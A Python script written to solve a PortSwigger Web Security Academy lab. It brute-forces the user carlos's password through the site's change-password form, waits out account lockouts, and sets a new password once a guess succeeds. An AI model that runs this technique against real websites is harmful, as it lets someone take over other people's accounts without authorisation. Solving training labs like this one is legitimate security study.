# A simple python program made to solve the following PortSwigger Lab:
# https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change

# Basic program logic:
# Iterate through every password
# For every password, open a session with the server
# Log in with valid credentials (wiener:peter)
# If the account has been locked, sleep for 60 seconds
# Verify successful login by checking for a login message in the response HTML
# If login was successful, make a POST request to /my-account/change-password with the following parameters and values:
#     username: target_username
#     current-password: current_password_in_loop
#     new-password-1: new_password
#     new-password-2: new_password
# If "Password changed successfully!" is found in the response HTML, return the old password and print the value of the new password.
# Otherwise, keep checking passwords.

import requests
import time
import sys

SUB_DOMAIN = "" # Change This Line With Labs Subdomain
WEBSITE_URL = "https://" + SUB_DOMAIN + "." + "web-security-academy.net"
LOGIN_PATH = "/login"
CHANGE_PASS_PATH = "/my-account/change-password"
PASSWORD_FILE = "../../Word-Lists/password-wordlist.txt"
VALID_USERNAME = "wiener"
VALID_PASSWORD = "peter"
TARGET_USERNAME = "carlos"
TARGETS_NEW_PASSWORD = "newpassword1"
ACCOUNT_LOCK_MESSAGE = "Please try again in 1 minute(s)."
LOGIN_MESSAGE = f"Your username is: {VALID_USERNAME}"
SUCCESS_MESSAGE = "Password changed successfully!"

def load_file_lines(file_name):
    try:
        print(f"Loading {file_name}...")
        array = []
        with open(file_name, 'r') as file:
            for line in file:
                array.append(line.strip())
        return array
    except FileNotFoundError:
        print(f"Error: File '{file_name}' not found.")
    return None

def attempt_login():
    SESSION = requests.Session()
    LOGIN_DATA = {"username": VALID_USERNAME, "password": VALID_PASSWORD}
    login_response = SESSION.post(WEBSITE_URL + LOGIN_PATH, data = LOGIN_DATA)
    if ACCOUNT_LOCK_MESSAGE in login_response.text:
        print("Account Has Been Locked Out, Sleeping For 60 Seconds...")
        time.sleep(60)
        login_response = SESSION.post(WEBSITE_URL + LOGIN_PATH, data = LOGIN_DATA)
    if LOGIN_MESSAGE in login_response.text:
        print("Login successful!")
        return SESSION
    else:
        print("Login failed. Please check your credentials.")
    return None

def send_post_data(session, password):
    FORM_DATA = {"username": TARGET_USERNAME, "current-password": password, "new-password-1": TARGETS_NEW_PASSWORD, "new-password-2": TARGETS_NEW_PASSWORD}
    form_response = session.post(WEBSITE_URL + CHANGE_PASS_PATH, data = FORM_DATA)
    return form_response

def find_password(passwords):
    for password in passwords:
        session = attempt_login()
        if session == None:
            break
        response = send_post_data(session, password)
        print(f"{password} --> {response.status_code}")
        if SUCCESS_MESSAGE in response.text:
            print("Password Changed Successfully!")
            return password
    return None

def main():
    print(f"Program Starting... Target URL: {WEBSITE_URL}")
    PASSWORDS = load_file_lines(PASSWORD_FILE)
    if PASSWORDS is None:
        sys.exit(1)
    PASSWORD = find_password(PASSWORDS)
    if PASSWORD is None:
        print("Could Not Find Password...")
        sys.exit(1)
    print(f"Password for {TARGET_USERNAME} was changed from {PASSWORD} to {TARGETS_NEW_PASSWORD}")
    return 0

if __name__ == "__main__":
    main()
